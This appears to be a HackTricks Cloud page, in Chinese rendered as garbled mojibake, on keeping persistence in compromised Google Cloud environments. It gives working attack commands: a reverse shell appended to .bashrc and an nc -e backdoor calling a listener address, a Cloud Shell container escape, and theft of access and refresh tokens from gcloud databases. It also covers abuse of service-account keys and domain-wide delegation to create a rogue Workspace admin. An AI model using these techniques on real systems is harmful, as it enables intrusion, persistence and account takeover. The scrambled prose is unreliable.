# GCP - éæœåŠ¡æŒä¹…æ€§

<details>

<summary><strong>é€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS çº¢é˜Ÿä¸“å®¶)</strong></a><strong>ä»é›¶å¼€å§‹å­¦ä¹  AWS é»‘å®¢æ”»å‡»ï¼</strong></summary>

æ”¯æŒ HackTricks çš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³åœ¨ **HackTricks ä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š** æˆ– **ä¸‹è½½ HackTricks çš„ PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å– [**å®˜æ–¹ PEASS & HackTricks å•†å“**](https://peass.creator-spring.com)
* å‘ç° [**PEASS å®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„ [**NFT é›†åˆ**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨ **Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

è¿™äº›æ˜¯ä¸€äº›æœ‰ç”¨çš„æŠ€æœ¯ï¼Œä¸€æ—¦ä½ ä»¥æŸç§æ–¹å¼æ”»ç ´äº†ä¸€äº› GCP å‡­è¯æˆ–åœ¨ GCP ç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨ã€‚

## è°·æ­Œçš„ Cloud Shell <a href="#e5eb" id="e5eb"></a>

### æŒä¹…æ€§åé—¨

[**è°·æ­Œ Cloud Shell**](https://cloud.google.com/shell/) ä¸ºæ‚¨æä¾›äº†ç›´æ¥ä»æµè§ˆå™¨è®¿é—®äº‘èµ„æºçš„å‘½ä»¤è¡Œè®¿é—®ï¼Œæ— éœ€ä»»ä½•ç›¸å…³æˆæœ¬ã€‚

æ‚¨å¯ä»¥ä» **ç½‘ç»œæ§åˆ¶å°** è®¿é—®è°·æ­Œçš„ Cloud Shellï¼Œæˆ–è¿è¡Œ **`gcloud cloud-shell ssh`**ã€‚

è¿™ä¸ªæ§åˆ¶å°å¯¹æ”»å‡»è€…æ¥è¯´æœ‰ä¸€äº›æœ‰è¶£çš„åŠŸèƒ½ï¼š

1. **ä»»ä½•æœ‰æƒè®¿é—®è°·æ­Œäº‘çš„è°·æ­Œç”¨æˆ·** éƒ½å¯ä»¥è®¿é—®ä¸€ä¸ªå®Œå…¨è®¤è¯çš„ Cloud Shell å®ä¾‹ã€‚
2. è¯¥å®ä¾‹å°†åœ¨æ²¡æœ‰æ´»åŠ¨çš„æƒ…å†µä¸‹ **è‡³å°‘ä¿æŒå…¶ä¸»ç›®å½• 120 å¤©**ã€‚
3. ç»„ç»‡ **æ— æ³•ç›‘æ§** è¯¥å®ä¾‹çš„æ´»åŠ¨ã€‚

è¿™åŸºæœ¬ä¸Šæ„å‘³ç€æ”»å‡»è€…å¯ä»¥åœ¨ç”¨æˆ·çš„ä¸»ç›®å½•ä¸­æ”¾ç½®ä¸€ä¸ªåé—¨ï¼Œåªè¦ç”¨æˆ·æ¯ 120 å¤©è‡³å°‘è¿æ¥åˆ° GC Shell ä¸€æ¬¡ï¼Œåé—¨å°±ä¼šå­˜æ´»ä¸‹æ¥ï¼Œæ¯æ¬¡è¿è¡Œæ—¶æ”»å‡»è€…å°±ä¼šå¾—åˆ°ä¸€ä¸ª shellï¼Œåªéœ€æ‰§è¡Œï¼š
```bash
echo '(nohup /usr/bin/env -i /bin/bash 2>/dev/null -norc -noprofile >& /dev/tcp/'$CCSERVER'/443 0>&1 &)' >> $HOME/.bashrc
```
åœ¨ä¸»ç›®å½•ä¸­è¿˜æœ‰ä¸€ä¸ªåä¸º **`.customize_environment`** çš„æ–‡ä»¶ï¼Œå¦‚æœè¯¥æ–‡ä»¶å­˜åœ¨ï¼Œæ¯æ¬¡ç”¨æˆ·è®¿é—® **cloud shell** æ—¶éƒ½ä¼š**æ‰§è¡Œ**ï¼ˆå¦‚å‰ä¸€æŠ€æœ¯æ‰€è¿°ï¼‰ã€‚åªéœ€æ’å…¥å‰é¢çš„åé—¨æˆ–ç±»ä¼¼ä»¥ä¸‹çš„åé—¨ï¼Œåªè¦ç”¨æˆ·â€œç»å¸¸â€ä½¿ç”¨ cloud shellï¼Œå°±å¯ä»¥ä¿æŒæŒä¹…æ€§ï¼š
```bash
#!/bin/sh
apt-get install netcat -y
nc <LISTENER-ADDR> 443 -e /bin/bash
```
{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œ**é¦–æ¬¡åœ¨ Cloud Shell ä¸­æ‰§è¡Œéœ€è¦è®¤è¯çš„æ“ä½œæ—¶**ï¼Œå®ƒä¼šåœ¨ç”¨æˆ·çš„æµè§ˆå™¨ä¸­**å¼¹å‡º**ä¸€ä¸ªæˆæƒçª—å£ï¼Œå¿…é¡»åœ¨å‘½ä»¤è¿è¡Œä¹‹å‰æ¥å—ã€‚å¦‚æœå‡ºç°æ„å¤–çš„å¼¹å‡ºçª—å£ï¼Œç›®æ ‡å¯èƒ½ä¼šå˜å¾—æ€€ç–‘å¹¶ä¸”ç»ˆæ­¢æŒä¹…æ€§æ–¹æ³•ã€‚
{% endhint %}

### Google Cloud Shell å®¹å™¨é€ƒé€¸

è¯·æ³¨æ„ï¼ŒGoogle Cloud Shell è¿è¡Œåœ¨ä¸€ä¸ªå®¹å™¨å†…ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹æ“ä½œ**è½»æ¾é€ƒç¦»åˆ°å®¿ä¸»æœº**ï¼š
```bash
sudo docker -H unix:///google/host/var/run/docker.sock pull alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock run -d -it --name escaper -v "/proc:/host/proc" -v "/sys:/host/sys" -v "/:/rootfs" --network=host --privileged=true --cap-add=ALL alpine:latest
sudo docker -H unix:///google/host/var/run/docker.sock start escaper
sudo docker -H unix:///google/host/var/run/docker.sock exec -it escaper /bin/sh
```
è¿™ä¸è¢«è°·æ­Œè§†ä¸ºä¸€ä¸ªæ¼æ´ï¼Œä½†å®ƒèƒ½è®©ä½ æ›´å¹¿æ³›åœ°äº†è§£è¯¥ç¯å¢ƒä¸­å‘ç”Ÿçš„äº‹æƒ…ã€‚

æ­¤å¤–ï¼Œè¯·æ³¨æ„ï¼Œä»ä¸»æœºä¸Šä½ å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæœåŠ¡è´¦æˆ·ä»¤ç‰Œï¼š
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/"
default/
vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/
```
ä»¥ä¸‹èŒƒå›´ï¼š
```bash
wget -q -O - --header "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/service-accounts/vms-cs-europe-west1-iuzs@m76c8cac3f3880018-tp.iam.gserviceaccount.com/scopes"
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring.write
```
## ä»¤ç‰ŒåŠ«æŒ

### å·²è®¤è¯ç”¨æˆ·

å¦‚æœä½ è®¾æ³•è®¿é—®äº†**GCPä¸­å·²è®¤è¯ç”¨æˆ·çš„å®¶ç›®å½•**ï¼Œ**é»˜è®¤æƒ…å†µä¸‹**ï¼Œä½ å°†èƒ½å¤Ÿ**éšæ„è·å–è¯¥ç”¨æˆ·çš„ä»¤ç‰Œ**ï¼Œæ— éœ€è®¤è¯ï¼Œæ— è®ºä½ ä½¿ç”¨ä»–çš„ä»¤ç‰Œçš„æœºå™¨å¦‚ä½•ï¼Œå³ä½¿ç”¨æˆ·é…ç½®äº†MFAã€‚

è¿™æ˜¯å› ä¸ºé»˜è®¤æƒ…å†µä¸‹ï¼Œä½ **å¯ä»¥éšæ„ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œ**æ¥ç”Ÿæˆæ–°çš„ä»¤ç‰Œã€‚

è¦è·å–ç”¨æˆ·å½“å‰çš„ä»¤ç‰Œï¼Œä½ å¯ä»¥è¿è¡Œï¼š

{% code overflow="wrap" %}
```bash
sqlite3 ./.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
```
è·å–ç”Ÿæˆæ–°è®¿é—®ä»¤ç‰Œçš„è¯¦ç»†ä¿¡æ¯ï¼Œè¯·è¿è¡Œï¼š
```
```bash
sqlite3 ./.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
```
è¦ä½¿ç”¨åˆ·æ–°ä»¤ç‰Œã€å®¢æˆ·ç«¯IDå’Œå®¢æˆ·ç«¯å¯†é’¥è·å–æ–°çš„åˆ·æ–°åçš„è®¿é—®ä»¤ç‰Œï¼Œè¯·è¿è¡Œï¼š
```
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
### æœåŠ¡è´¦æˆ·

å°±åƒå·²è®¤è¯ç”¨æˆ·ä¸€æ ·ï¼Œå¦‚æœä½ è®¾æ³•**è·å–æœåŠ¡è´¦æˆ·çš„ç§é’¥æ–‡ä»¶**ï¼Œä½ å°†èƒ½å¤Ÿ**é€šå¸¸æƒ…å†µä¸‹éšå¿ƒæ‰€æ¬²åœ°è®¿é—®å®ƒ**ã€‚\
ç„¶è€Œï¼Œå¦‚æœä½ çªƒå–äº†æœåŠ¡è´¦æˆ·çš„**OAuthä»¤ç‰Œ**ï¼Œè¿™å¯èƒ½æ›´åŠ æœ‰è¶£ï¼Œå› ä¸ºå³ä½¿é»˜è®¤æƒ…å†µä¸‹è¿™äº›ä»¤ç‰Œåªæœ‰ä¸€ä¸ªå°æ—¶çš„æœ‰æ•ˆæœŸï¼Œå¦‚æœ**å—å®³è€…åˆ é™¤äº†ç§æœ‰APIå¯†é’¥ï¼ŒOAuthä»¤ç‰Œä»ç„¶æœ‰æ•ˆï¼Œç›´åˆ°å®ƒè¿‡æœŸ**ã€‚

### å…ƒæ•°æ®

æ˜¾ç„¶ï¼Œåªè¦ä½ åœ¨GCPç¯å¢ƒä¸­è¿è¡Œçš„æœºå™¨å†…éƒ¨ï¼Œä½ å°†èƒ½å¤Ÿ**é€šè¿‡è”ç³»å…ƒæ•°æ®ç«¯ç‚¹è®¿é—®é™„åŠ åˆ°è¯¥æœºå™¨çš„æœåŠ¡è´¦æˆ·**ï¼ˆæ³¨æ„ï¼Œåœ¨æ­¤ç«¯ç‚¹ä¸­å¯ä»¥è®¿é—®çš„OAuthä»¤ç‰Œé€šå¸¸å—åˆ°èŒƒå›´é™åˆ¶ï¼‰ã€‚

### è¡¥æ•‘æªæ–½

è¿™äº›æŠ€æœ¯çš„ä¸€äº›è¡¥æ•‘æªæ–½åœ¨[https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)ä¸­æœ‰è§£é‡Š

## ç»•è¿‡è®¿é—®èŒƒå›´ <a href="#bypassing-access-scopes" id="bypassing-access-scopes"></a>

å½“ä½¿ç”¨[è®¿é—®èŒƒå›´](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)æ—¶ï¼Œä¸ºè®¡ç®—å®ä¾‹ï¼ˆVMï¼‰ç”Ÿæˆçš„OAuthä»¤ç‰Œå°†**åŒ…å«ä¸€ä¸ª**[**èŒƒå›´**](https://oauth.net/2/scope/)**é™åˆ¶**ã€‚ç„¶è€Œï¼Œä½ å¯èƒ½èƒ½å¤Ÿ**ç»•è¿‡**è¿™ä¸ªé™åˆ¶å¹¶åˆ©ç”¨è¢«æ³„éœ²è´¦æˆ·çš„æƒé™ã€‚

**ç»•è¿‡**è¿™ä¸ªé™åˆ¶çš„**æœ€ä½³æ–¹å¼**æ˜¯è¦ä¹ˆ**æ‰¾åˆ°æ–°çš„å‡­æ®**åœ¨è¢«æ³„éœ²çš„ä¸»æœºä¸­ï¼Œè¦ä¹ˆ**æ‰¾åˆ°æœåŠ¡å¯†é’¥ä»¥ç”Ÿæˆæ— é™åˆ¶çš„OAuthä»¤ç‰Œ**ï¼Œè¦ä¹ˆ**è·³è½¬åˆ°ä¸€ä¸ªé™åˆ¶è¾ƒå°‘çš„ä¸åŒVM**ã€‚

**å¼¹å‡ºå¦ä¸€ä¸ªç›’å­**

ç¯å¢ƒä¸­å¯èƒ½å­˜åœ¨å…·æœ‰è¾ƒå°‘è®¿é—®èŒƒå›´é™åˆ¶çš„å…¶ä»–ç›’å­ã€‚å¦‚æœä½ èƒ½æŸ¥çœ‹`gcloud compute instances list --quiet --format=json`çš„è¾“å‡ºï¼Œè¯·å¯»æ‰¾å…·æœ‰ä½ æƒ³è¦çš„ç‰¹å®šèŒƒå›´æˆ–**`auth/cloud-platform`**å…¨åŒ…å«èŒƒå›´çš„å®ä¾‹ã€‚

ä¹Ÿè¦æ³¨æ„åˆ†é…äº†é»˜è®¤æœåŠ¡è´¦æˆ·çš„å®ä¾‹ï¼ˆ`PROJECT_NUMBER-compute@developer.gserviceaccount.com`ï¼‰ã€‚

**æœç´¢æœåŠ¡è´¦æˆ·å¯†é’¥**

Googleéå¸¸æ˜ç¡®åœ°æŒ‡å‡º[**"è®¿é—®èŒƒå›´ä¸æ˜¯å®‰å…¨æœºåˆ¶â€¦â€¦åœ¨ä¸é€šè¿‡OAuthè®¤è¯çš„è¯·æ±‚ä¸­å®ƒä»¬æ²¡æœ‰æ•ˆæœ"**](https://cloud.google.com/compute/docs/access/service-accounts#accesscopesiam)ã€‚

å› æ­¤ï¼Œå¦‚æœä½ åœ¨å®ä¾‹ä¸Š**æ‰¾åˆ°ä¸€ä¸ª**[**æœåŠ¡è´¦æˆ·å¯†é’¥**](https://cloud.google.com/iam/docs/creating-managing-service-account-keys)ï¼Œä½ å¯ä»¥ç»•è¿‡é™åˆ¶ã€‚è¿™äº›æ˜¯**RSAç§é’¥**ï¼Œå¯ä»¥ç”¨æ¥è®¤è¯åˆ°Google Cloud APIå¹¶**è¯·æ±‚ä¸€ä¸ªæ— èŒƒå›´é™åˆ¶çš„æ–°OAuthä»¤ç‰Œ**ã€‚

æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•æœåŠ¡è´¦æˆ·åœ¨æŸä¸ªæ—¶åˆ»å¯¼å‡ºäº†å¯†é’¥ï¼š
```bash
for i in $(gcloud iam service-accounts list --format="table[no-heading](email)"); do
echo "Looking for keys for $i:"
gcloud iam service-accounts keys list --iam-account $i
done
```
è¿™äº›æ–‡ä»¶**é»˜è®¤ä¸å­˜å‚¨åœ¨è®¡ç®—å®ä¾‹ä¸Š**ï¼Œå› æ­¤ä½ éœ€è¦å¾ˆå¹¸è¿æ‰èƒ½é‡åˆ°å®ƒä»¬ã€‚æ–‡ä»¶çš„é»˜è®¤åç§°æ˜¯`[project-id]-[portion-of-key-id].json`ã€‚å› æ­¤ï¼Œå¦‚æœä½ çš„é¡¹ç›®åç§°æ˜¯`test-project`ï¼Œé‚£ä¹ˆä½ å¯ä»¥åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­**æœç´¢`test-project*.json`**ï¼Œå¯»æ‰¾è¿™ä¸ªå¯†é’¥æ–‡ä»¶ã€‚

æ–‡ä»¶çš„å†…å®¹çœ‹èµ·æ¥åƒè¿™æ ·ï¼š
```json
{
"type": "service_account",
"project_id": "[PROJECT-ID]",
"private_key_id": "[KEY-ID]",
"private_key": "-----BEGIN PRIVATE KEY-----\n[PRIVATE-KEY]\n-----END PRIVATE KEY-----\n",
"client_email": "[SERVICE-ACCOUNT-EMAIL]",
"client_id": "[CLIENT-ID]",
"auth_uri": "https://accounts.google.com/o/oauth2/auth",
"token_uri": "https://accounts.google.com/o/oauth2/token",
"auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
"client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/[SERVICE-ACCOUNT-EMAIL]"
}
```
æˆ–è€…ï¼Œå¦‚æœ**é€šè¿‡CLIç”Ÿæˆ**ï¼Œå®ƒä»¬å°†å¦‚ä¸‹æ‰€ç¤ºï¼š
```json
{
"name": "projects/[PROJECT-ID]/serviceAccounts/[SERVICE-ACCOUNT-EMAIL]/keys/[KEY-ID]",
"privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE",
"privateKeyData": "[PRIVATE-KEY]",
"validAfterTime": "[DATE]",
"validBeforeTime": "[DATE]",
"keyAlgorithm": "KEY_ALG_RSA_2048"
}
```
å¦‚æœæ‚¨ç¡®å®æ‰¾åˆ°äº†è¿™äº›æ–‡ä»¶ä¹‹ä¸€ï¼Œæ‚¨å¯ä»¥å‘Šè¯‰ **`gcloud` å‘½ä»¤é‡æ–°è®¤è¯** è¿™ä¸ªæœåŠ¡è´¦æˆ·ã€‚æ‚¨å¯ä»¥åœ¨å®ä¾‹ä¸Šæ‰§è¡Œæ­¤æ“ä½œï¼Œæˆ–åœ¨å®‰è£…äº†å·¥å…·çš„ä»»ä½•æœºå™¨ä¸Šæ‰§è¡Œã€‚
```bash
gcloud auth activate-service-account --key-file [FILE]
```
ä½ ç°åœ¨å¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤**æµ‹è¯•ä½ çš„æ–° OAuth ä»¤ç‰Œ**ï¼š
```bash
TOKEN=`gcloud auth print-access-token`
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=$TOKEN
```
æ‚¨åº”è¯¥ä¼šçœ‹åˆ°åˆ—å‡ºçš„ `https://www.googleapis.com/auth/cloud-platform` èŒƒå›´ï¼Œè¿™æ„å‘³ç€æ‚¨**ä¸å—ä»»ä½•å®ä¾‹çº§è®¿é—®èŒƒå›´çš„é™åˆ¶**ã€‚æ‚¨ç°åœ¨æœ‰å……åˆ†çš„æƒåŠ›ä½¿ç”¨æ‰€æœ‰åˆ†é…ç»™æ‚¨çš„IAMæƒé™ã€‚

## é€šè¿‡å¯¹Workspaceçš„åŸŸèŒƒå›´æˆæƒä¼ æ’­ <a href="#spreading-to-g-suite-via-domain-wide-delegation-of-authority" id="spreading-to-g-suite-via-domain-wide-delegation-of-authority"></a>

[**Workspace**](https://gsuite.google.com) æ˜¯Googleçš„**åä½œå’Œç”Ÿäº§åŠ›å¹³å°**ï¼ŒåŒ…æ‹¬Gmailã€Google Calendarã€Google Driveã€Google Docsç­‰ã€‚

GCPä¸­çš„**æœåŠ¡è´¦æˆ·**å¯ä»¥è¢«æˆäºˆ**ä»¥ç¼–ç¨‹æ–¹å¼è®¿é—®Workspaceç”¨æˆ·æ•°æ®çš„æƒåˆ©**ï¼Œé€šè¿‡å†’å……åˆæ³•ç”¨æˆ·ã€‚è¿™è¢«ç§°ä¸º[åŸŸèŒƒå›´å§”æ´¾](https://developers.google.com/admin-sdk/reports/v1/guides/delegation)ã€‚è¿™åŒ…æ‹¬åƒåœ¨GMailä¸­**è¯»å–** **ç”µå­é‚®ä»¶**ã€è®¿é—®Google Docsï¼Œç”šè‡³åœ¨G Suiteç»„ç»‡ä¸­åˆ›å»ºæ–°çš„ç”¨æˆ·è´¦æˆ·çš„æ“ä½œã€‚

Workspaceæœ‰[å®ƒè‡ªå·±çš„API](https://developers.google.com/gsuite/aspects/apis)ï¼Œå®Œå…¨ç‹¬ç«‹äºGCPã€‚æƒé™è¢«æˆäºˆWorkspaceï¼Œ**GCPå’ŒWorkspaceä¹‹é—´æ²¡æœ‰ä»»ä½•é»˜è®¤å…³ç³»**ã€‚

ç„¶è€Œï¼Œå¯ä»¥**ç»™**æœåŠ¡è´¦æˆ·**æƒé™**è¦†ç›–Workspaceç”¨æˆ·ã€‚å¦‚æœæ­¤æ—¶æ‚¨å¯ä»¥è®¿é—®Web UIï¼Œæ‚¨å¯ä»¥æµè§ˆåˆ° **IAM -> æœåŠ¡è´¦æˆ·**ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰ä»»ä½•è´¦æˆ·åœ¨**"åŸŸèŒƒå›´å§”æ´¾"åˆ—ä¸‹åˆ—å‡ºäº†"å·²å¯ç”¨"**ã€‚å¦‚æœæ²¡æœ‰è´¦æˆ·å¯ç”¨ï¼Œè¯¥åˆ—æœ¬èº«å¯èƒ½**ä¸ä¼šæ˜¾ç¤º**ï¼ˆæ‚¨å¯ä»¥é˜…è¯»æ¯ä¸ªæœåŠ¡è´¦æˆ·çš„è¯¦ç»†ä¿¡æ¯æ¥ç¡®è®¤è¿™ä¸€ç‚¹ï¼‰ã€‚æˆªè‡³æœ¬æ–‡æ’°å†™æ—¶ï¼Œå°šæ— æ³•ä»¥ç¼–ç¨‹æ–¹å¼æ‰§è¡Œæ­¤æ“ä½œï¼Œå°½ç®¡åœ¨Googleçš„é”™è¯¯è·Ÿè¸ªå™¨ä¸­æœ‰ä¸€ä¸ª[æ­¤åŠŸèƒ½çš„è¯·æ±‚](https://issuetracker.google.com/issues/116182848)ã€‚

è¦åˆ›å»ºè¿™ç§å…³ç³»ï¼Œéœ€è¦åœ¨GCPå’ŒWorkforceä¸­**å¯ç”¨å®ƒ**ã€‚

#### æµ‹è¯•Workspaceè®¿é—®

è¦æµ‹è¯•æ­¤è®¿é—®ï¼Œæ‚¨éœ€è¦ä»¥JSONæ ¼å¼å¯¼å‡ºçš„**æœåŠ¡è´¦æˆ·å‡­æ®**ã€‚æ‚¨å¯èƒ½åœ¨æ—©æœŸæ­¥éª¤ä¸­è·å¾—äº†è¿™äº›ï¼Œæˆ–è€…æ‚¨ç°åœ¨å¯èƒ½æœ‰æ‰€éœ€çš„è®¿é—®æƒé™ï¼Œä»¥åˆ›å»ºä¸€ä¸ªæ‚¨çŸ¥é“å·²å¯ç”¨åŸŸèŒƒå›´å§”æ´¾çš„æœåŠ¡è´¦æˆ·çš„å¯†é’¥ã€‚

è¿™ä¸ªè¯é¢˜æœ‰ç‚¹æ£˜æ‰‹â€¦â€¦æ‚¨çš„æœåŠ¡è´¦æˆ·æœ‰ä¸€ä¸ªç§°ä¸º"client\_email"çš„ä¸œè¥¿ï¼Œæ‚¨å¯ä»¥åœ¨å¯¼å‡ºçš„JSONå‡­è¯æ–‡ä»¶ä¸­çœ‹åˆ°ã€‚å®ƒå¯èƒ½çœ‹èµ·æ¥åƒæ˜¯ `account-name@project-name.iam.gserviceaccount.com`ã€‚å¦‚æœæ‚¨å°è¯•ç›´æ¥ä½¿ç”¨è¯¥ç”µå­é‚®ä»¶è®¿é—®Workforce APIè°ƒç”¨ï¼Œå³ä½¿å¯ç”¨äº†å§”æ´¾ï¼Œæ‚¨ä¹Ÿä¼šå¤±è´¥ã€‚è¿™æ˜¯å› ä¸ºWorkforceç›®å½•ä¸ä¼šåŒ…å«GCPæœåŠ¡è´¦æˆ·çš„ç”µå­é‚®ä»¶åœ°å€ã€‚ç›¸åï¼Œè¦ä¸Workforceäº’åŠ¨ï¼Œæˆ‘ä»¬éœ€è¦å®é™…å†’å……æœ‰æ•ˆçš„Workforceç”¨æˆ·ã€‚

æ‚¨çœŸæ­£æƒ³åšçš„æ˜¯**å†’å……å…·æœ‰ç®¡ç†è®¿é—®æƒé™çš„ç”¨æˆ·**ï¼Œç„¶åä½¿ç”¨è¯¥è®¿é—®æƒé™åšä¸€äº›äº‹æƒ…ï¼Œæ¯”å¦‚**é‡ç½®å¯†ç ã€ç¦ç”¨å¤šå› ç´ è®¤è¯ï¼Œæˆ–è€…åªæ˜¯ä¸ºè‡ªå·±åˆ›å»ºä¸€ä¸ªå…¨æ–°çš„ç®¡ç†å‘˜è´¦æˆ·**ã€‚

Gitlabåˆ›å»ºäº†[è¿™ä¸ªPythonè„šæœ¬](https://gitlab.com/gitlab-com/gl-security/gl-redteam/gcp\_misc/blob/master/gcp\_delegation.py)ï¼Œå®ƒå¯ä»¥åšä¸¤ä»¶äº‹ - åˆ—å‡ºç”¨æˆ·ç›®å½•å’Œåˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†è´¦æˆ·ã€‚ä»¥ä¸‹æ˜¯æ‚¨ä½¿ç”¨å®ƒçš„æ–¹æ³•ï¼š
```bash
# Validate access only
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com

# List the directory
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--list

# Create a new admin account
./gcp_delegation.py --keyfile ./credentials.json \
--impersonate steve.admin@target-org.com \
--domain target-org.com \
--account pwned
```
æ‚¨å¯ä»¥å°è¯•åœ¨ä¸€ç³»åˆ—ç”µå­é‚®ä»¶åœ°å€ä¸Šè¿è¡Œæ­¤è„šæœ¬ï¼Œä»¥æ¨¡æ‹Ÿ**å„ç§** **ç”¨æˆ·**ã€‚æ ‡å‡†è¾“å‡ºå°†æŒ‡ç¤ºæœåŠ¡å¸æˆ·æ˜¯å¦æœ‰æƒè®¿é—®Workforceï¼Œå¹¶å°†åŒ…æ‹¬**æ–°ç®¡ç†å‘˜å¸æˆ·çš„éšæœºå¯†ç **ï¼ˆå¦‚æœåˆ›å»ºäº†ä¸€ä¸ªï¼‰ã€‚

å¦‚æœæ‚¨æˆåŠŸåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜å¸æˆ·ï¼Œæ‚¨å¯ä»¥ç™»å½•åˆ°[Googleç®¡ç†æ§åˆ¶å°](https://admin.google.com)ï¼Œå¹¶å®Œå…¨æ§åˆ¶G Suiteä¸­æ¯ä¸ªç”¨æˆ·çš„ä¸€åˆ‡ - ç”µå­é‚®ä»¶ã€æ–‡æ¡£ã€æ—¥å†ç­‰ã€‚å°½æƒ…äº«ç”¨ã€‚

## å‚è€ƒèµ„æ–™

* [https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec](https://89berner.medium.com/persistant-gcp-backdoors-with-googles-cloud-shell-2f75c83096ec)
* [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-1)
* [https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/](https://securityintelligence.com/posts/attacker-achieve-persistence-google-cloud-platform-cloud-shell/)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸º</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWSçº¢é˜Ÿä¸“å®¶)</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨å¸Œæœ›åœ¨**HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDFç‰ˆæœ¬**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
